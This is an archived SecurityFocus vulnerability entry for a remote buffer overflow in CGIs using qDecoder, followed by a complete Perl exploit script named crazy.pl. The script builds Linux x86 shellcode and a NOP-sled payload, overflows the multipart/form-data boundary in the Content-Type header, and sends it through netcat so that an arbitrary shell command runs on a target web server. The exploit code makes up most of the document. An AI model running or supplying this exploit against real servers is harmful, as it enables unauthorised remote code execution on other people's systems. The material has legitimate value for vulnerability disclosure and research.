source: http://www.securityfocus.com/bid/2329/info

Improperly validated user-supplied input to the Content-Type header can create an overflow condition.

As a result, excessive data copied onto the stack can overwrite critical parts of the stack frame such as the calling functions' return address, potentially allowing remote code execution with the privileges of the webserver.

#!/usr/bin/perl
# crazy.pl
#
# CrazyWWWBoard.cgi Remote Buffer Overflow Exploit for i386 Linux
#
# CGIs using qDecoder 4.0~5.0.8 are vulnerable to boundary delimeter
# over 254 characters in the header "Content-Type: multipart/form-data".
#
# nc, the netcat program is required.
#
# Programmed by Jin Ho You, jhyou@chonnam.chonnam.ac.kr, 03/26/2000

$nc_path = "nc";        # path of netcat program

$usage =
"usage: crazy.pl [options] CGI-URL\n
  CGI-URL        URL of the target CGI
  -c command     Bourne shell command
                 Default: '/bin/echo 00ps, Crazy!'
  -o offset      Offset of the egg shell code,
                 Recommended [-300,+300]

example)
  crazy.pl http://target.com:8080/cgi-bin/vulnerable.cgi
  crazy.pl -o -47 target.com/cgi-bin/vulnerable.cgi
  crazy.pl -c 'echo vulnerable.cgi has a security hole! | mail root' \\
           target.com/cgi-bin/vulnerable.cgi

";

require 'getopt.pl';
Getopt('oc');

if ($#ARGV < 0) {
    print $usage;
    exit(0);
};

$cgiurl = $ARGV[0];
$command = $opt_c ? $opt_c : "/bin/echo 00ps, Crazy!";
$offset = $opt_o ? $opt_o : 0;

$cgiurl =~ s/http:\/\///;
($host, $cgiuri) = split(/\//, $cgiurl, 2);
($host, $port) = split(/:/, $host);
$port = 80 unless $port;
$command = "/bin/echo Content-Type: text/html;/bin/echo;($command)";
$cmdlen = length($command);
$argvp = int((0x0b + $cmdlen) / 4) * 4 + 4;
$shellcode =
  "\xeb\x37"                            # jmp 0x37
. "\x5e"                                # popl %esi
. "\x89\x76" . pack(C, $argvp)          # movl %esi,0xb(%esi)
. "\x89\xf0"                            # movl %esi,%eax
. "\x83\xc0\x08"                        # addl $0x8,%eax
. "\x89\x46" . pack(C, $argvp + 4)      # movl %eax,0xb(%esi)
. "\x89\xf0"                            # movl %esi,%eax
. "\x83\xc0\x0b"                        # addl $0xb,%eax
. "\x89\x46" . pack(C, $argvp + 8)      # movl %eax,0xb(%esi)
. "\x31\xc0"                            # xorl %eax,%eax
. "\x88\x46\x07"                        # movb %eax,0x7(%esi)
. "\x4e"                                # dec %esi
. "\x88\x46\x0b"                        # movb %eax,0xb(%esi)
. "\x46"                                # inc %esi
. "\x88\x46" . pack(C, 0x0b + $cmdlen)  # movb %eax,0xb(%esi)
. "\x89\x46" . pack(C, $argvp + 12)     # movl %eax,0xb(%esi)
. "\xb0\x0b"                            # movb $0xb,%al
. "\x89\xf3"                            # movl %esi,%ebx
. "\x8d\x4e" . pack(C, $argvp)          # leal 0xb(%esi),%ecx
. "\x8d\x56" . pack(C, $argvp + 12)     # leal 0xb(%esi),%edx
. "\xcd\x80"                            # int 0x80
. "\x31\xdb"                            # xorl %ebx,%ebx
. "\x89\xd8"                            # movl %ebx,%eax
. "\x40"                                # inc %eax
. "\xcd\x80"                            # int 0x80
. "\xe8\xc4\xff\xff\xff"                # call -0x3c
. "/bin/sh0-c0"                         # .string "/bin/sh0-c0"
. $command;
$offset -= length($command) / 2 + length($host . $port , $cgiurl);
$shelladdr = 0xbffffbd0 + $offset;
$noplen = 242 - length($shellcode);
$jump = $shelladdr + $noplen / 2;
$entries = $shelladdr + 250;
$egg = "\x90" x $noplen . $shellcode . pack(V, $jump) x 9
        . pack(V, $entries) x 2 . pack(V, $jump) x 2;

$content = substr($egg, 254) .
  "--\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n0\r\n--$egg--\r\n";
$contentlength = length($content);

printf STDERR "Jump to 0x%x\n", $jump;

open(HTTP, "|$nc_path $host $port");
select(HTTP); $|= 1;
print HTTP <<__HEADER__;
POST /$cgiuri HTTP/1.0
Connection: Keep-Alive
User-Agent: Mozilla/4.72 [ko] (X11; I; Linux 2.2.14 i686)
Host: $host:$port
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzip
Accept-Language: ko
Accept-Charset: euc-kr,*,utf-8
Content-type: multipart/form-data; boundary=$egg
Content-length: $contentlength

$content
__HEADER__
close(HTTP);